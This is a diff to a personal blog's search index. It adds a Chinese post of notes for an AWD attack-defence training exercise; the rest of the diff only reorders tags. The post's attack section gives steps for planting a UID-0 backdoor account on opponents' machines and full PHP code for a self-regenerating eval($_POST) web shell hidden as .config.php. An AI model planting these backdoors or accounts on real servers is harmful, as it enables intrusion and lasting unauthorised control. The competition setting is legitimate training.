@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>【网络安全5x01】洞明科技网络安全红蓝对抗培训 --- day1</title>
+      <link href="/1096/"/>
+      <url>/1096/</url>
+      
+        <content type="html"><![CDATA[<p>看来这网络安全是没完了，又搞护网、攻防、培训。一群门外汉，搞点小儿科，不知意义有多大。专业的事情交给专业的厂家来做不是更合适吗。</p><p>本来去年比赛拿第一之后我已经算是毕业了，我也对这个完全丧失兴趣了。是时候该去找新事物了。</p><p>新买了把机械键盘，正好试键盘，敲一点明天AWD的笔记给小伙伴用。</p><a id="more"></a><h1 id="AWD笔记"><a href="#AWD笔记" class="headerlink" title="AWD笔记"></a>AWD笔记</h1><h2 id="防守"><a href="#防守" class="headerlink" title="防守"></a>防守</h2><h3 id="1-改密码"><a href="#1-改密码" class="headerlink" title="1.改密码"></a>1.改密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh root@[ip]:[port]   <span class="comment">#ssh登录靶机</span></span><br><span class="line"></span><br><span class="line">sudo passwd root       <span class="comment">#修改root用户密码</span></span><br></pre></td></tr></table></figure><h3 id="2-删用户"><a href="#2-删用户" class="headerlink" title="2.删用户"></a>2.删用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd     <span class="comment">#看最后一行,</span></span><br><span class="line">deluser [user]      <span class="comment">#有奇怪的用户就删掉</span></span><br><span class="line"></span><br><span class="line">控制面板 - 用户账户 - 删除用户账户   <span class="comment">#win系统删用户方法</span></span><br></pre></td></tr></table></figure><h3 id="3-踢人"><a href="#3-踢人" class="headerlink" title="3.踢人"></a>3.踢人</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">w                  <span class="comment">#显示现在在线的人</span></span><br><span class="line">ps -ef | grep ssh  <span class="comment">#如果有其它用户或者ip，就找到这个进程的[pid]</span></span><br><span class="line"><span class="built_in">kill</span> -9 [pid]      <span class="comment">#杀掉进程</span></span><br></pre></td></tr></table></figure><h3 id="4-备份网站"><a href="#4-备份网站" class="headerlink" title="4.备份网站"></a>4.备份网站</h3><p>使用ftp下载<code>/var/www/html/</code>目录到本地，然后启动<strong>cnseay</strong>工具扫网站漏洞后门。</p><h3 id="5-修漏洞"><a href="#5-修漏洞" class="headerlink" title="5.修漏洞"></a>5.修漏洞</h3><p><code>ma.php</code>这种预先放在目录下的后门，直接从ftp删除即可，其它的根据扫完情况再说。</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="1-登对方靶机"><a href="#1-登对方靶机" class="headerlink" title="1.登对方靶机"></a>1.登对方靶机</h3><p>如果密码公开，抢先登录对方靶机，添加用户<code>config</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adduser config</span><br><span class="line"><span class="comment">#密码随便输两遍，其它全部回车</span></span><br></pre></td></tr></table></figure><p>使用vim修改用户组为0：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/passwd</span><br></pre></td></tr></table></figure><p>修改前<code>config:x:1001:1002:,,,:/home/config:/bin/bash</code></p><p>修改后<code>config:x:0:1002:,,,:/home/config:/bin/bash</code></p><h3 id="2-连接对方预先放置的后门"><a href="#2-连接对方预先放置的后门" class="headerlink" title="2.连接对方预先放置的后门"></a>2.连接对方预先放置的后门</h3><p>地址：http://[ip]:[port]/ma.php</p><p>密码：cmd</p><p>连上去赶紧传不死马，<code>/var/www/html/</code>下各个目录随便传，越多越好。名字也要做好隐蔽,我一般常用<code>.config.php</code>，<code>.index.php</code>，<code>.struct.php</code>等等这种，前面加<code>.</code>表示隐藏。</p><p>不死马是指一个不停生成木马后门的木马，一旦执行，删文件没有用，必须要删进程才行。</p><p>这货长这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$file = <span class="string">'.config.php'</span>;</span><br><span class="line"></span><br><span class="line">$shell = <span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">file_put_contents($file, $shell);</span><br><span class="line"></span><br><span class="line">system(<span class="string">'chmod 777 .config.php'</span>);</span><br><span class="line"></span><br><span class="line">usleep(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>万一对手也会玩了，那就执行这个文件这样杀：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#@unlink('config.php');</span></span><br><span class="line"></span><br><span class="line">exec(<span class="string">"ps aux|grep www-data|grep -v grep|awk '&#123;print $2&#125;'|xargs kill -9"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-随意玩了"><a href="#3-随意玩了" class="headerlink" title="3.随意玩了"></a>3.随意玩了</h3><p>有且不只有后台弱口令、sql注入、文件包含、文件上传、命令执行、xss等漏洞，这个根据扫出来的情况随意玩了</p><p>不过其实种好不死马，就已经可以稳定获取flag了</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>【网络安全4x03】洞明科技网络安全培训 --- day3</title>
       <link href="/1095/"/>
       <url>/1095/</url>
@@ -965,9 +984,9 @@
             
             <tag> dirb </tag>
             
-            <tag> nikto </tag>
-            
             <tag> metasploit </tag>
+            
+            <tag> nikto </tag>
             
         </tags>
       
@@ -1030,9 +1049,9 @@
       
         <tags>
             
-            <tag> hexo </tag>
-            
             <tag> git </tag>
+            
+            <tag> hexo </tag>
             
             <tag> coding </tag>
             
@@ -1740,9 +1759,9 @@
       
         <tags>
             
-            <tag> hexo </tag>
-            
             <tag> git </tag>
+            
+            <tag> hexo </tag>
             
             <tag> nodejs </tag>
             
@@ -1989,9 +2008,9 @@
       
         <tags>
             
-            <tag> deep learning </tag>
-            
             <tag> backpropagation </tag>
+            
+            <tag> deep learning </tag>
             
         </tags>
       
@@ -2010,9 +2029,9 @@
       
         <tags>
             
-            <tag> caffe </tag>
-            
             <tag> deep learning </tag>
+            
+            <tag> caffe </tag>
             
             <tag> android </tag>
             
@@ -2033,9 +2052,9 @@
       
         <tags>
             
-            <tag> caffe </tag>
-            
             <tag> deep learning </tag>
+            
+            <tag> caffe </tag>
             
             <tag> opencv </tag>
             
